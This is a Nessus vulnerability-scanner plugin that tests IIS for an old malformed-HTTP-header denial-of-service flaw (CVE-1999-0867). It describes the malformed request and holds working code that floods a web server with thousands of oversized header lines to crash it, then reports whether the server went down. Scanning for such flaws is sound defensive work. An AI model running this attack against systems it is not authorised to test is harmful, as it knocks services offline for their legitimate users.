#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10119);
 if(defined_func("script_xref"))script_xref(name:"IAVA", value:"1996-t-0006");
 script_bugtraq_id(579);
 script_version ("$Revision: 1.24 $");
 script_cve_id("CVE-1999-0867");
 name["english"] = "NT IIS Malformed HTTP Request Header DoS Vulnerability";
 name["francais"] = "Vulnérabilité de IIS : en-têtes de requêtes mal formées";


 script_name(english:name["english"],
	     francais:name["francais"]);
 
 # Description
 desc["english"] = "
It was possible to crash the remote web server
by sending a malformed header request, like :

	GET / HTTP/1.1
	Host: aaaaaaaaaaaa... (200 bytes)
	Host: aaaaaaaaaaaa... (200 bytes)
	... 10,000 lines ...
	Host: aaaaaaaaaaaa... (200 bytes)


This flaw allows an attacker to shut down your
webserver, thus preventing legitimate users from
connecting to your web server.

Solution : See http://www.microsoft.com/technet/security/bulletin/ms99-029.mspx
if you are using IIS. Or else, contact the vendor of
your web server and notify it of this flaw.

Risk factor : High

Bugtraq Id : 579";

 desc["francais"] = "
Il s'est avéré possible de faire planter le serveur
web distant en envoyant une requête HTTP mal formée
telle que :
	GET / HTTP/1.1
	Host: aaaaaaaaaaaa... (200 bytes)
	Host: aaaaaaaaaaaa... (200 bytes)
	... 10,000 lignes ...
	Host: aaaaaaaaaaaa... (200 bytes)
	
Ce problème permet à un pirate de mettre hors service
votre serveur web, empechant ainsi les utilisateurs
légitimes de s'y connecter.

Solution : Voyez http://www.microsoft.com/security/bulletins/ms99-029.asp
si vous utilisez IIS. Sinon, contactez l'éditeur de votre
serveur web et informez-le de cette vulnérabilité.

Facteur de risque : Elevé

Id Bugtraq : 579";


 script_description(english:desc["english"],
 		    francais:desc["francais"]);

 # Summary
 summary["english"] = "Performs a denial of service against IIS";
 summary["francais"] = "Provoque un déni de service contre un serveur IIS";
 script_summary(english:summary["english"],
 		francais:summary["francais"]);

 # Category
 script_category(ACT_DENIAL);	# ACT_FLOOD?

 # Dependencie(s)
 script_dependencie("find_service.nes", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 
 # Family
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"],
 	       francais:family["francais"]);
 
 # Copyright
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 
 script_require_ports("Services/www", 80);
 exit(0);
}

# The attack starts here
include("http_func.inc"); 
port = get_http_port(default:80);

sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "IIS" >!< sig ) exit(0);
if(get_port_state(port))
{
 data = string("GET / HTTP/1.1\r\n");
 crp  = string("hostname : ", crap(200), "\r\n");
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 else
 {
  send(socket:soc, data:data);
  for(j=0;j<10000;j=j+1)
   if (send(socket:soc, data:crp) <= 0)
    break;
  end = string("\r\n\r\n");
  send(socket:soc, data:end);
  close(soc);
  sleep(2);
  soc2 = open_sock_tcp(port);
  if(!soc2){
  	security_hole(port);
	exit(0);
	}
  else {
  send(socket:soc2, data:data);
  for(j=0;j<1000;j=j+1)
   if (send(socket:soc2, data:crp) <= 0)
    break;
  end = string("\r\n\r\n");
  send(socket:soc2, data:end);
  close(soc2);
  }
  sleep(2);
  soc3 = open_sock_tcp(port);
  if(!soc3)security_hole(port);
  else close(soc3);
 }
}
